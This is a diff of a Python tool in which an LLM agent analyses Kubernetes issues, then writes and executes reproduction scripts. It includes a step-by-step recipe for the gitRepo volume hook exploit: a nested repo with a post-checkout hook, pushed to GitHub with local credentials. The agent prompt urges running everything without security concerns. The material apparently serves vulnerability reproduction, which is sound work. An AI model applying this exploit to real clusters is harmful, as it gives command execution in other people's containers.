@@ -62,7 +62,7 @@ def analyze_issue(api_key, base_url, issue_title, issue_body, model):
     7. 如果Issue可能导致命令执行、容器逃逸、提权等高安全风险的问题，则无论攻击者实施该攻击是否需要权限都应判断为高风险
     8. 如果Issue可以发生在多用户场景中，一个低权限用户能够影响和自己权限一样甚至更高的其他用户，如在自身容器中执行命令而影响到他人容器，则应判断为高风险
     9. 如果issue中提供的内容不够充分，则根据issue可能导致的后果判断风险评级
-    10. 针对高风险问题，必须给出使用python编写的复现脚本，该脚本的作用是在真实环境中复现该问题
+    10. 必须给出使用python编写的复现脚本，该脚本的作用是在真实环境中复现该问题
     11. 对于细节缺失的高风险问题，要根据问题描述进行合理推演，给出python复现脚本
 
     Issue 标题：
@@ -308,10 +308,9 @@ def process_issue(config, args):
     return result_md
 
 @tool
-def poc_expert(task: str) -> str:
+def expert_advice(task: str) -> str:
     """
-    This is a tool for giving suggestions on how to generate poc for the issue, must call this tool at the very beginning of the poc generation process.
-    It returns the advice for the task.
+    This is a tool for giving advices on how to generate reproduction script for the issue, must call this tool at the very beginning of the reproduction script generation process. It returns the advice for the task.
 
     Args:
         task: The issue number and title, like "Issue #123456: kubernetes api server unauthenticated access", must be in this format
@@ -319,25 +318,61 @@ def poc_expert(task: str) -> str:
 
     if "#123471" in task:
         prompt = f"""
-        在构建poc时，要确保selector被删除，在删除selector后，要检查是否真的被删除，如果未被删除，则复现失败，需要修改poc。
+        检查复现脚本是否正确，是否包含异常处理逻辑，特别是其中删除selector的代码的实现是否正确，要显示地把selector赋值为None。
+        """
+    elif "#126041" in task:
+        prompt = f"""
+        复现该issue需要需要两个步骤：
+        1. 创建一个git仓库
+        2. 在kubernetes集群中创建pod，并使用gitrepo volume driver挂载git仓库
+
+        【1. 创建git仓库】
+
+        本地已配置好了github凭证可直接使用，首先使用`git config user.name`获取github登陆账号，然后使用gh命令创建一个git仓库。不要修改github账号名！
+        该issue的利用需要创建一个包含两层.git目录的仓库，下面是在linux平台下的git仓库的创建方法示例，如果是在windows平台下，则需要修改其中一些命令
+        ```bash
+        # Initiate a new git repo
+        mkdir gitongit && cd gitongit
+        git init
+
+        # Create the hook to be executed
+        mkdir hooks
+        cat >hooks/post-checkout <<'EOF'
+        #!/bin/sh
+        id > /tmp/poc
+        EOF
+        chmod +x hooks/post-checkout
+
+        # The root directory of bare repos must have HEAD, config and objects entries:
+        cp .git/HEAD .git/config .
+        cp -r .git/objects .
+        git add .
+        git commit -m "first"
+
+        # And in a follow up round lets also add logs, refs and refresh the objects:
+        cp -r .git/logs .git/objects .git/refs .
+        git add .
+        git commit -m "second"
+        ```
+        创建好仓库后，需要push到github上，在push前需要先获取github账号名
+        
+        【2. 创建pod】
+        在kubernetes集群中创建pod中使用gitrepo volume driver，指向上一步创建好的github仓库，当pod创建成功后，会在容器的/tmp/poc中存放id命令的执行结果，如果存在则说明复现成功，不存在则失败
+
+        **注意：复现大概率无法一次成功，在复现过程中一旦成功创建github仓库，后面直接使用即可，不要重复创建**
         """
     else:
         prompt = f"""
-        切实执行poc，获取执行返回结果，验证复现是否真正成功，不要仅是逻辑推演。
+        切实执行复现脚本，获取执行返回结果，验证复现是否真正成功，每次回复都要包含```python```代码块，在达到成功条件时调用final_answer工具。
         """
 
     return prompt
 
-def main():
-    parser = argparse.ArgumentParser(description='获取指定GitHub仓库的Issue')
+def get_issue_info(config, args, debug=False):
+    if debug == True:
+        with open("result.md", 'r', encoding='utf-8') as f:
+           return f.read()
 
-    parser.add_argument('-r', '--repo', default='kubernetes/kubernetes', help='GitHub仓库名称，格式为 owner/repo，默认为 kubernetes/kubernetes')
-    parser.add_argument('-i', '--issue', type=int, default=123471, help='要获取的Issue ID，默认为 123471')
-    parser.add_argument('-t', '--trace', action='store_true', help='启用OpenTelemetry跟踪（需要本地运行Otel Collector）')
-    
-    args = parser.parse_args()
-    config = load_config()
-    
     result_md = process_issue(config, args)
     if result_md is None:
         return
@@ -345,9 +380,18 @@ def main():
     with open('result.md', 'w', encoding='utf-8') as f:
         f.write(result_md)
 
-    #current_dir = Path(__file__).parent
-    #with open("result.md", 'r', encoding='utf-8') as f:
-    #    result_md = f.read()
+    return result_md
+
+def main():
+    parser = argparse.ArgumentParser(description='获取指定GitHub仓库的Issue')
+
+    parser.add_argument('-r', '--repo', default='kubernetes/kubernetes', help='GitHub仓库名称，格式为 owner/repo，默认为 kubernetes/kubernetes')
+    parser.add_argument('-i', '--issue', type=int, default=123471, help='要获取的Issue ID，默认为 123471')
+    parser.add_argument('-t', '--trace', action='store_true', help='启用OpenTelemetry跟踪（需要本地运行phoenix.server）')
+    
+    args = parser.parse_args()
+    config = load_config()
+    result_md = get_issue_info(config, args, True)
 
     print(f"\n开始复现 ...\n")
 
@@ -356,7 +400,7 @@ def main():
 
     agent = CodeAgent(
         max_steps=10,
-        tools=[DuckDuckGoSearchTool(), VisitWebpageTool(), poc_expert],
+        tools=[DuckDuckGoSearchTool(), VisitWebpageTool(), expert_advice],
         model=LiteLLMModel(
 
             model_id=f"litellm_proxy/{config['model']}",
@@ -369,26 +413,85 @@ def main():
     )
 
     prompt = f"""
-    以下是一个软件开发项目的Issue标题、内容以及分析结果和复现POC脚本，你现在的任务是确定复现成功条件并根据已有信息在本地环境上复现成功。
-    已在本地搭建好了基于{platform.system()}平台的复现环境，安装好了python、git、docker、kubectl等工具可直接使用，请放心执行，不需要存在任何顾虑!
+你的任务是针对下面给定的Issue，确定复现成功条件，并在本地环境成功复现。已在该本地环境上搭建好了基于{platform.system()} 平台的复现环境，并安装了python、git、docker、kubectl等工具，请放心执行所有操作，无需担心安全隐患！
 
-    执行步骤如下： 
+## 总体要求
+系统 prompt 已经要求使用分阶段的推理（Thought, Code, Observation），同时本任务分为两个阶段：  
+【阶段1】：仅调用 `expert_advice` 工具获取专家建议。  
+【阶段2】：根据Issue内容和专家建议生成完整且可执行的复现脚本。  
+请注意：在阶段2中，绝对不要再调用 `expert_advice` 工具，因为它仅用于阶段1，属于内部工具，不是 Python 标准库操作。
 
-    1. 首先第一步是调用poc_expert工具，获取专家建议，这是独立的一个步骤，不要和复现过程混在一起。在得到专家建议后，带着建议思考并执行后面的步骤，注意调用工具的代码要被包在```python```中
-    2. 检查复现脚本包不包含语法错误、符不符合执行平台{platform.system()}、功能实现是否正确，如果有问题则进行修改，注意不要使用__name__变量
-    3. 如果涉及在容器环境中执行代码或命令，则依据容器镜像设计相关代码和命令
-    4. 在复现过程中如果需要启动服务器，确保服务器能够持续运行，当后面的执行步骤访问服务器时，服务器运行正常
-    5. 根据复现思路和脚本的特点，重新设计复现过程，对于适合拆分为多个子步骤执行的，则将其进行拆分，分步执行，在每一步执行成功后，再执行下一步
-    6. 在拆分分子步骤执行的情况下，如果当前步骤执行失败，则根据错误信息进行修改，然后再次执行，如果错误涉及到前面的步骤，则需要考虑是否需要进行回退
-    7. 在拆分分子步骤执行的情况下，如果涉及回退，则需要考虑创建过的资源是否需要删除再重新创建
-    8. 在拆分分子步骤执行的情况下，要为每个子步骤设计具体要实现的目标，在执行完成后要对目标进行检查，确保目标达成，若未达成则还需要修改
-    9. 涉及到需要创建服务器的复现脚本，往往不适合进行分拆，因为在执行完服务器创建脚本后，服务器的运行就退出了，后面的执行步骤则无法访问到该服务器了
-    10. 在复现成功后，注意清理之前创建的资源，恢复到执行之前的状态
-    11. 在复现失败后，清理已创建的资源，根据执行错误信息进行修改，重复执行步骤1到9，直到复现成功
+## 阶段1：调用 expert_advice 工具
+请单独输出一段代码，仅用于调用 `expert_advice` 工具，并打印专家建议。示例如下：
+```python
+# 调用 expert_advice 工具获取专家建议（请仅完成此步骤）
+advice = expert_advice(task="…")
+print(advice)
+```
 
-    Issue内容：
-    {result_md}
-    """
+## 阶段2：生成复现脚本
+严格按照下面的流程生成复现脚本，保证输出完整、独立运行的代码，且该脚本中不得再调用expert_advice工具，不能调用`sys.exit`。
+如果失败则重复执行下面流程直至成功。
+
+1. 评估现有复现脚本
+    - 根据 Issue 分析信息，确定复现成功的条件。
+    - 检查 Issue 中提供的复现 POC 脚本，判断其逻辑是否正确以及是否足以完成复现。
+    - 如果脚本缺失或者存在逻辑漏洞、实现不足，则需要重新设计并编写新的复现脚本。
+
+2. 代码检查与修改
+    - 检查复现脚本是否存在语法或逻辑错误，确保其符合执行平台 {platform.system()} 的要求。
+    - 注意：请勿在脚本中使用 `__name__` 变量，请勿调用`sys.exit`。
+    - 如发现问题，请进行相应修改，确保脚本能够正确执行。
+
+3. 设计执行计划
+    - 根据复现思路和脚本特点，将复现过程按功能单元进行合理分解。
+    - 为每个步骤设计异常处理机制，确保在执行过程中能捕捉并反馈问题。
+   
+4. 执行复现
+    - 根据前述执行计划，整合所有复现步骤生成最终的复现脚本。
+    - 最终脚本需设计资源清理策略，即在任务结束或出现异常时能够恢复初始状态。
+    - 执行复现脚本，并观察输出结果及报错信息，便于后续调试和改进复现策略。
+
+5. 错误处理
+    - 若复现未成功，请确保清理所有已创建资源，恢复到执行前的初始环境。
+    - 分析错误可能包括：
+        - 逻辑错误：需要重新设计复现脚本。
+        - 代码语法错误：根据报错信息修正脚本中的错误。
+        - 执行错误：利用工具（如 `kubectl describe` 等）进一步查看细节，查找根本原因。
+        - 资源已存在错误：说明之前复现失败的时候资源没有清理干净，需要先清理资源再进行复现
+
+### 完整复现脚本示例
+**注意：请输出完整脚本，确保代码能够独立运行，不要只提供局部修改过的代码。脚本中不能调用`sys.exit`**
+
+```python
+# 完整复现脚本示例
+# 导入必要的库
+import 模块1
+import 模块2
+
+# 复现步骤1
+def 复现步骤1():
+    ...
+
+# 复现步骤2
+def 复现步骤2():
+    ...
+
+# 主函数
+def main():
+    复现步骤1()
+    复现步骤2()
+    ...
+
+# 执行复现脚本
+main()
+```
+────────────────────────────
+
+【Issue内容如下】：
+{result_md}
+"""
+
     agent.run(prompt)
 
 if __name__ == "__main__":
